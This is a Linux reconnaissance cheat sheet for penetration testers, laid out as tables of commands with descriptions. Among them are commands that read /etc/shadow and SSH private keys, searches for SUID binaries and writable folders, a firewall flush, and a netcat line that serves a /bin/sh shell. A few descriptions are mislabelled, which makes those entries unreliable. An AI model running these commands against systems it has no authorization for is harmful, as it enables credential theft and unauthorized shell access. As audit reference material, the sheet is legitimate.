**Authors**: < [nixawk](https://github.com/nixawk) >

----

# Information Gathering - Linux

## System Architecture

|**Command**|**Description**|
|:----------|:--------------|
|uname -a|The **uname** command reports basic information about a computer's software and hardware.|
|cat /etc/issue|The file **/etc/issue** is a text file which contains a message or system identification to be printed before the login prompt.|
|cat /etc/*-release|**/etc/lsb-release**, **/etc/redhat-release** files contain a description line which is parsed to get information. ex: "Distributor release x.x (Codename)"|
|cat /proc/version|**/proc/version** specifies the version of the Linux kernel, the version of gcc used to compile the kernel, and the time of kernel compilation. It also contains the kernel compiler's user name.|
|cat /proc/sys/kernel/version|The files in **/proc/sys/kernel/** can be used to tune and monitor miscellaneous and general things in the operation of the Linux kernel. [**Kernel - Documentation**](https://www.kernel.org/doc/Documentation/sysctl/kernel.txt)|


## Processes

|**Command**|**Description**|
|:----------|:--------------|
|ps -ef<BR>ps aux|**ps** can report a snapshot of the current processes.|
|top|**top** command displays processor activity of your Linux box and also displays tasks managed by kernel in real-time. It'll show processor and memory are being used and other information like running processes.|
|ls -al /proc/|**/proc** is very special in that it is also a virtual filesystem. It's sometimes referred to as a process information pseudo-file system. It doesn't contain 'real' files but runtime system information (e.g. system memory, devices mounted, hardware configuration, etc). |
|ls -al /proc/3080|View information about PID **3080**.|

## Users and Groups

|**Command**|**Description**|
|:----------|:--------------|
|id|Find a user's UID or GID and other information.|
|w|Display who is logged into the Linux and Unix-like server.|
|whoami|Display the user name of the owner of the current login session to standard output.|
|lastlog|Formats and prints the contents of the last login log /var/log/lastlog file.|
|cat /etc/passwd|A text-based database of information about users that may log in to the system or other operating system user identities that own running processes.|
|cat /etc/shadow|**/etc/shadow** is used to increase the security level of passwords by restricting all but highly privileged users' access to hashed password data. Typically, that data is kept in files owned by and accessible only by the super user.|
|cat /etc/master.passwd|**/etc/master.passwd** on BSD systems|
|cat /etc/sudoers|**/etc/sudoers** has the rules that users have to follow when using sudo command.|
|sudo -V|Print the sudo version string|
|cat ~/.ssh/authorized_keys|With public key authentication, the authenticating entity has a public key and a private key. Each key is a large number with special mathematical properties. The private key is kept on the computer you log in from, while the public key is stored on the **.ssh/authorized_keys** file on all the computers you want to log in to. |
|cat ~/.ssh/identity.pub|The file **identity.pub** contains your public key, which can be added to other system's authorized keys files. |
|cat ~/.ssh/identity|The ssh client allows you to selects a file from which the identity (private key) for RSA or DSA authentication is read.|
|cat ~/.ssh/id_rsa.pub|RSA public key will be saved as .ssh/id_rsa.pub.|
|cat ~/.ssh/id_rsa|RSA private key saved as .ssh/id_rsa in your home folder.|
|cat ~/.ssh/id_dsa.pub|DSA public key will be saved as .ssh/id_rsa.pub.|
|cat ~/.ssh/id_dsa|DSA private key saved as .ssh/id_rsa in your home folder.|
|cat /etc/ssh/ssh_config|OpenSSH SSH client configuration files|
|cat /etc/ssh/sshd_config|OpenSSH SSH Server configuration files|
|cat /etc/ssh/ssh_host_dsa_key.pub|The DSA public key used by the sshd daemon.|
|cat /etc/ssh/ssh_host_dsa_key|The DSA private key used by the sshd daemon.|
|cat /etc/ssh/ssh_host_rsa_key.pub|The RSA public key used by the sshd daemon for version 2 of the SSH protocol.|
|cat /etc/ssh/ssh_host_rsa_key|The RSA private key used by the sshd daemon.|


## Services

|**Command**|**Description**|
|:----------|:--------------|
|service -status-all|Check status of all services|
|systemctl -a|List all units installed in the file system.|
|service `servicename` start<BR>systemctl start `servicename`|Start a service|
|service `servicename` stop<BR>systemctl stop `servicename`|Stop a service|
|service `servicename` status<BR>systemctl status `servicename`|Show the status of a service|
|cat /etc/services|/etc/services maps port numbers to named services.|

## Security

|**Command**|**Description**|
|:----------|:--------------|
|iptables -L|List all rules in the selected chain.|
|iptables -F|Flush the selected chain.|
|iptables -A INPUT -p icmp -m icmp --icmp-type 0 -j ACCEPT|Please try **iptables -p icmp --help** for more details.|
|iptables -A INPUT -p tcp -m tcp --sport 80 -m state --state RELATED,ESTABLISHED -j ACCEPT|Allow tcp connections from src port 80|
|iptables -A OUTPUT -p tcp -m tcp --dport 80 -m state --state NEW,RELATED,ESTABLISHED -j ACCEPT|Allow tcp connections from/to dst port 80.|
|iptables -A INPUT -p udp -m udp --sport 53 -m state --state RELATED,ESTABLISHED -j ACCEPT|Allow udp connections from src port 80|
|iptables -A OUTPUT -p udp -m udp --dport 53 -m state --state NEW,RELATED,ESTABLISHED -j ACCEPT|Allow udp connections from/to dst port 53.|
|iptables -A OUTPUT -p tcp -m tcp --sport 55552 -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT<BR>iptables -A OUTPUT -p tcp -m tcp --dport 55552 -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT|Allow localhost to connect to localhost:55552|

## Networking

|**Command**|**Description**|
|:----------|:--------------|
|ifconfig -a|display all interfaces which are currently available, even if down.|
|hostname|show or set the system's host name.|
|dnsdomainname|show the system's DNS domain name.|
|netstat -antp|show network status|
|netstat -anup|show network status|
|chkconfig --list||
|lsof -nPi|list open files|
|route -e|show / manipulate the IP routing table|
|iwconfig|configure a wireless network interface|
|cat /etc/resolv.conf|The resolver configuration file contains information that is read by the resolver routines the first time they are invoked by a process.  The file is designed to be human readable and contains a list of keywords with values that provide various types of resolver information. If this file does not exist, only the name server on the local machine will be queried; the domain name is determined from the hostname and the domain search path is constructed from the domain name.|
|cat /etc/hosts|**/etc/hosts** is a simple text file that associates IP addresses with hostnames, one line per IP address.|
|cat /etc/network/interfaces|**/etc/network/interfaces** file contains network interface configuration information.|
|cat /etc/sysconfig/network|**/etc/sysconfig/network** file is used to specify information about the desired network configuration on your server.|
|cat /etc/networks|**/etc/networks** is a plain ASCII file that describes known DARPA networks and symbolic names for these networks.|
|cat /proc/net/tcp|Print tcp info in hex mode|
|cat /proc/net/udp|Print udp info in hex mode|
|cat /proc/net/icmp|Print icmp info in hex mode|
|cat /proc/net/route|Print route info in hex mode|
|cat /etc/inetd.conf|inetd, called also the super server, will load a network program based upon a request from the network. The inetd.conf file tells inetd which ports to listen to and what server to start for each port.|
|cat /etc/xinetd.conf|xinetd.conf is the configuration file that determines the services provided by xinetd.|
|ls -R /etc/network/|Show files about network configuration|
|ls -al /etc/init.d|List all init scripts|
|iptables -L -t nat|Print rules of nat chain|
|iptables -L -t mangle|Print rules of mangle chain|
|tcpdump|tcpdump cheat sheet|
|nc -v `host` `port`|Make a tcp connection to host:port|
|nc -v -e /bin/sh -l -p `port`|Reverse a /bin/sh shell to localhost:port|

## File Systems

|**Command**|**Description**|
|:----------|:--------------|
|cat /etc/profile|/etc/profile contains Linux system wide environment and startup programs. It is used by all users with bash, ksh, sh shell.|
|cat /etc/bashrc|/etc/bashrc or /etc/bash.bashrc is the systemwide bash per-interactive-shell startup file. Is is used system wide functions and aliases. |
|cat ~/.bash_profile|similar to /etc/profile, but just for current user|
|car ~/.bash_history|Print current user bash commands history|
|cat ~/.bashrc|~/.bashrc is the individual per-interactive-shell startup file stored in your home directory $HOME.|
|car ~/.zshrc|~/.zshrc is the individual per-interactive-shell startup file stored in your home directory $HOME.|
|cat ~/.bash_logout|The file ~/.bash_logout is not used for an invocation of the shell. It is read and executed when a user exits from an interactive login shell.|
|ls -al /var/log/|List all logs files|
|find / -perm -1000 -type d 2>/dev/null | Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.|
|find / -perm -g=s -type f 2>/dev/null | SGID (chmod 2000) - run as the group, not the user who started it.|
|find / -perm -u=s -type f 2>/dev/null  | SUID (chmod 4000) - run as the owner, not the user who started it.|
|find / -perm -g=s -o -perm -u=s -type f 2>/dev/null | SGID or SUID|
|for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done | Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)|
|find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null|find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)|
|find / -writable -type d 2>/dev/null| world-writeable folders|
|find / -perm -222 -type d 2>/dev/null|world-writeable folders|
|find / -perm -o w -type d 2>/dev/null| world-writeable folders|
|find / -perm -o x -type d 2>/dev/null|world-executable folders|
|find / \( -perm -o w -perm -o x \) -type d 2>/dev/null | world-writeable & executable folders|
|find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print|world-writeable files|
|find /dir -xdev \( -nouser -o -nogroup \) -print|Noowner files|

## Scheduled

|**Command**|**Description**|
|:----------|:--------------|
|crontab -l|display current contab on standard output|
|ls -alh /var/spool/cron||
|ls -al /etc/cron*||
|cat /etc/cron*||
|cat /etc/at.allow|The /etc/at.allow and /etc/at.deny files determine which user can submit commands for later execution via at or batch.|
|cat /etc/at.deny|The /etc/at.allow and /etc/at.deny files determine which user can submit commands for later execution via at or batch.|
|cat /etc/cron.allow||
|cat /etc/cron.deny||
|cat /etc/crontab||
|cat /etc/anacrontab||
|ls -la /var/spool/cron/crontabs|List all users's crontab files|
|cat /var/spool/cron/crontabs/root|Print root user crontab|


# Links

1. https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
2. https://github.com/CISOfy/lynis
3. https://github.com/rebootuser/LinEnum
4. https://github.com/nixawk/metasploit-modules/blob/master/.msf4/modules/post/linux/gather/enum_linux.rb
5. http://www.iptables.org/documentation/
4. http://packetlife.net/media/library/12/tcpdump.pdf
